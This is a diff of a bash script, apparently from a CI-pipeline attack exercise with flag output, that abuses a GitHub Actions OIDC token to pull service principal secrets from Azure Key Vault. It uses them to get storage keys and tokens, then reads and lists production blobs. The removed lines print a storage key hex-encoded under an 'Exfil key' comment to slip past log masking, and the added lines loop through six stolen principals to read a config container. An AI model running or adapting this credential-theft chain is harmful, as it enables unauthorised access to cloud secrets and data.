@@ -1,62 +1,58 @@
 #!/usr/bin/env bash
-set +x
+set -x
 OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
 KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
   -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
   -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
-SPSEC=$(curl -s -H "Authorization: Bearer $KV" \
-  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r .value)
-SA=$(echo "$SPSEC"|jq -r .appId); SK=$(echo "$SPSEC"|jq -r .clientSecret)
-SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
-  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
-KEYS=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
-  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01")
-KEY1=$(echo "$KEYS" | jq -r '.keys[0].value')
 
-# Exfil key: hex encode to avoid any masking/wrapping issues
-printf 'HEXKEY1=%s\n' "$(printf '%s' "$KEY1" | xxd -p | tr -d '\n')"
+# Try ALL SPs to listKeys on sttblappcfgprodx3euoz
+for SP in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
+  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
+  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
+  
+  # Try storage.azure.com scope directly (data plane)
+  ST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
+    --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
+  
+  if [ ${#ST} -gt 100 ]; then
+    # Try reading config blob with data plane token
+    CODE=$(curl -s -o /tmp/blob.txt -w "%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
+      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json")
+    echo "$SP config/internal-config.json: $CODE"
+    if [ "$CODE" = "200" ]; then
+      echo "FLAG_CONTENT: $(cat /tmp/blob.txt)"
+    fi
+    
+    # Try list blobs
+    CODE2=$(curl -s -o /tmp/list.txt -w "%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
+      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
+    echo "$SP list config blobs: $CODE2"
+    if [ "$CODE2" = "200" ]; then
+      echo "BLOBS: $(cat /tmp/list.txt | head -c 1000)"
+    fi
+  fi
+done
 
-# Use key directly to read build-2024.log via Python (handles SharedKey auth)
-python3 -c "
-import hashlib, hmac, base64, datetime, urllib.request, sys, os
+# Also try the OIDC SP itself directly for storage data plane
+ST2=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
+  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  -d "client_assertion=$OIDC" --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
+echo "OIDC SP storage token len: ${#ST2}"
 
-ACCOUNT='sttblcilogsprodx3euoz'
-KEY=os.environ['STORKEY']
-VERSION='2021-08-06'
+# Read config blob
+CODE3=$(curl -s -o /tmp/blob2.txt -w "%{http_code}" -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
+  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json")
+echo "OIDC SP config read: $CODE3"
+[ "$CODE3" = "200" ] && echo "FLAG: $(cat /tmp/blob2.txt)"
 
-def read_blob(container, blob):
-    now = datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
-    sts = f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{now}\nx-ms-version:{VERSION}\n/{ACCOUNT}/{container}/{blob}'
-    sig = base64.b64encode(hmac.new(base64.b64decode(KEY), sts.encode(), hashlib.sha256).digest()).decode()
-    url = f'https://{ACCOUNT}.blob.core.windows.net/{container}/{blob}'
-    req = urllib.request.Request(url, headers={'x-ms-date':now,'x-ms-version':VERSION,'Authorization':f'SharedKey {ACCOUNT}:{sig}'})
-    try:
-        r = urllib.request.urlopen(req, timeout=15)
-        return r.status, r.read().decode(errors='replace')
-    except urllib.error.HTTPError as e:
-        return e.code, e.read().decode()[:200]
+# List blobs
+CODE4=$(curl -s -o /tmp/list2.txt -w "%{http_code}" -H "Authorization: Bearer $ST2" -H "x-ms-version: 2021-08-06" \
+  "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list")
+echo "OIDC SP list: $CODE4"
+[ "$CODE4" = "200" ] && echo "BLOB_LIST: $(cat /tmp/list2.txt | head -c 1000)"
 
-# Read build-2024.log
-st, body = read_blob('logs', 'build-2024.log')
-print(f'BLOB logs/build-2024.log: status={st} body={body}')
-
-# Also enumerate and read ALL blobs in logs container
-def list_blobs(container):
-    now = datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
-    sts = f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{now}\nx-ms-version:{VERSION}\n/{ACCOUNT}/{container}\ncomp:list\nrestype:container'
-    sig = base64.b64encode(hmac.new(base64.b64decode(KEY), sts.encode(), hashlib.sha256).digest()).decode()
-    url = f'https://{ACCOUNT}.blob.core.windows.net/{container}?restype=container&comp=list'
-    req = urllib.request.Request(url, headers={'x-ms-date':now,'x-ms-version':VERSION,'Authorization':f'SharedKey {ACCOUNT}:{sig}'})
-    try:
-        r = urllib.request.urlopen(req, timeout=15)
-        return r.read().decode()
-    except urllib.error.HTTPError as e:
-        return f'ERR {e.code}'
-
-print(f'LIST logs: {list_blobs(\"logs\")}')
-" 2>&1
-
-echo "DONE"
+echo "=== DONE ==="
